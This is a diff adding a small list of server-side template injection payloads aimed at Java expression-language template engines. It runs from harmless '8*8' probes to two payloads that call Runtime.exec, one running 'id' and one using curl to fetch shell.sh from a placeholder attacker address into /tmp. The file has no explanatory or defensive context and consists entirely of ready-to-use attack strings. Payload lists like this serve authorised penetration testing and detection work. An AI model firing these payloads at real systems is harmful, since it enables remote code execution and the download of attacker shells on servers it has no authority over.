@@ -1,0 +1,5 @@
+${8*8}
+#{8*8}
+*{8*8}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('curl <YOUR_LOCAL_IP>:8000/shell.sh -o /tmp/shell.sh').getInputStream())}
